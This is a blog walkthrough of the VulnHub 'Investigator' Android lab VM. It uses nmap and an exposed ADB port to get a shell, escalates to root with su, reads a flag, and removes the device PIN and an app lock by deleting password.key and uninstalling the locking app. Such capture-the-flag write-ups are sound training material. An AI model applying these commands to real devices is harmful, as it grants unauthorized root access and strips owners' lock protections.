---
title: 靶机日记 三 | Investigator

categories:
  - Technical
tags:
  - Crack
date: 2020-08-21 19:35:43
---

You can find the machine there > [Investigator](https://www.vulnhub.com/entry/investigator-1,504/)

![Banner](http://leiblog.wang/static/image/2020/8/q69oEf.jpg)

This is my first time to hack a Android box. Actually , i have no experience in Android development , but this is a beginner Vuln target machine, i say to myself, it's a great way to learn something new!

<!-- more -->

![](http://leiblog.wang/static/image/2020/8/QxnxDS.png)

**start always with nmap**

```zsh
Princeling-Mac at ~ ❯ nmap -sC -sV -p- -oN nmap/initial 192.168.56.103
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 01:52 EEST
Nmap scan report for android-25abe18209db8058.zte.com.cn (192.168.1.10)
Host is up (0.00025s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
5555/tcp  open  adb     Android Debug Bridge device (name: android_x86; model: VMware Virtual Platform; device: x86)
8080/tcp  open  http    PHP cli server 5.5 or later
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Welcome To  UnderGround Sector
22000/tcp open  ssh     Dropbear sshd 2014.66 (protocol 2.0)
| ssh-hostkey:
|   2048 19:e2:9e:6c:c6:8d:af:4e:86:7c:3b:60:91:33:e1:85 (RSA)
|_  521 46:13:43:49:24:88:06:85:6c:75:93:73:b5:1d:8f:28 (ECDSA)
MAC Address: 00:0C:29:37:42:7C (VMware)
Service Info: OSs: Android, Linux; CPE: cpe:/o:linux:linux_kernel
```

Tcp port 5555 is an Android Debug service, we can use adb tools to exploit it.

**expliot with adb service**

```zsh
Princeling-Mac at ~ ❯ adb connect 192.168.56.103
connected to 192.168.56.103:5555
Princeling-Mac at ~ ❯ adb shell
uid=2000(shell) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats)@x86:/ $
```

We can even get root shell easily , just type in 'su'.

```zsh
uid=2000(shell) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats)@x86:/ $ su
uid=0(root) gid=0(root)@x86:/ # find / -type d -name root
find: /data/property/persist.sys.dalvik.vm.lib: Input/output error
/data/root
```

And get the first key!

```zsh
1|uid=0(root) gid=0(root)@x86:/ # cd /data/root/
uid=0(root) gid=0(root)@x86:/data/root # ls
flag.txt
uid=0(root) gid=0(root)@x86:/data/root # cat flag.txt
Great Move !!!

Itz a easy one right ???

lets make this one lil hard


You flag is not here  !!!


Agent "S"   Your Secret Key ---------------->259148637
uid=0(root) gid=0(root)@x86:/data/root #
```

`259148637`is wrong pin, but we can remove pin with root shell.

```zsh
uid=0(root) gid=0(root)@x86:/data/system # cd /data/system
uid=0(root) gid=0(root)@x86:/data/system # rm password.key
```

Reboot the box, now we can see there is no PIN, If we go to open an app asks for a pattern.

![](http://leiblog.wang/static/image/2020/8/mxV4cO.png)

Unlock it.

```zsh
uid=0(root) gid=0(root)@x86:/ # pm list packages | grep lock
package:com.domobile.applockwatcher
package:bong.android.androidlock
package:com.martianmode.applock
package:com.android.deskclock
promote at ~ ❯ adb uninstall com.martianmode.applock
Success
```

:(((()))) android box is hard to use !!!
